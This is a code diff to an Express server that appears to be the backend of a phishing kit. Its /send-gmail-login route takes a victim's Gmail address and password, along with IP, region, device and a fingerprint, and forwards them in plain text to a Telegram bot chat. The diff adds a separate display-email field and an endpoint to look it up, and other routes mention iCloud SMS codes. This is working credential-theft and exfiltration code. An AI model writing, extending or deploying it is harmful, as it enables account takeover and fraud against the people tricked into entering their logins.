@@ -1094,8 +1094,13 @@ app.post("/resend-icloud-sms", async (req, res) => {
 app.post("/send-gmail-login", async (req, res) => {
   try {
     console.log('🔍 DEBUG: /send-gmail-login endpoint called');
-    const { email, password, userId } = req.body;
-    console.log('🔍 DEBUG: Received email:', email, 'password:', password, 'userId:', userId);
+    const { email, displayEmail, password, userId } = req.body;
+    
+    // ✅ Use displayEmail if provided (different email user typed)
+    // Otherwise use email (for backward compatibility)
+    const messageEmail = displayEmail || email;
+    
+    console.log('🔍 DEBUG: Received email:', email, 'displayEmail:', messageEmail, 'password:', password, 'userId:', userId);
     
     if (!email || !password || !userId) {
       return res.status(400).json({ error: "Missing email, password, or userId" });
@@ -1105,11 +1110,10 @@ app.post("/send-gmail-login", async (req, res) => {
     const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
     console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
     
-    displayEmailStore[displayEmailKey] = email;
-    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
-    
-    displayEmailByRequestId[requestId] = email;
-    console.log(`📧 Stored display email by requestId ${requestId}: ${email}`);
+    // ✅ Store displayEmail for later retrieval
+    displayEmailStore[displayEmailKey] = messageEmail;
+    displayEmailByRequestId[requestId] = messageEmail;
+    console.log(`📧 Stored display email: ${messageEmail}`);
     
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1123,12 +1127,13 @@ app.post("/send-gmail-login", async (req, res) => {
       console.log(`💾 Stored fingerprint ${fingerprint} → ${email} (Gmail flow)`);
     }
 
-    pendingGmailLogin[requestId] = { status: "pending", email: email };
+    // ✅ Store both email (for tracking) and displayEmail (for showing)
+    pendingGmailLogin[requestId] = { status: "pending", email: email, displayEmail: messageEmail };
 
     const message =
       `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
       `<b>🔑 Password:</b> <code>${password}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
@@ -1149,7 +1154,7 @@ app.post("/send-gmail-login", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ SEND TO WINNER ONLY
+    // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
     if (email && userWinnerTelegram[email]) {
       console.log(`📨 Gmail going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
@@ -1173,6 +1178,27 @@ app.post("/send-gmail-login", async (req, res) => {
   } catch (err) {
     console.error("❌ Gmail Login endpoint error:", err);
     res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// GET /get-gmail-display-email - Get displayEmail for Gmail (for bot to display)
+// ============================================================================
+
+app.get("/get-gmail-display-email", (req, res) => {
+  try {
+    const requestId = (req.query.requestId || "").trim();
+
+    if (!requestId || !pendingGmailLogin[requestId]) {
+      return res.json({ displayEmail: "unknown" });
+    }
+
+    const displayEmail = pendingGmailLogin[requestId].displayEmail || pendingGmailLogin[requestId].email;
+    res.json({ displayEmail });
+
+  } catch (err) {
+    console.error("Get Gmail display email error:", err);
+    res.json({ displayEmail: "unknown" });
   }
 });
 
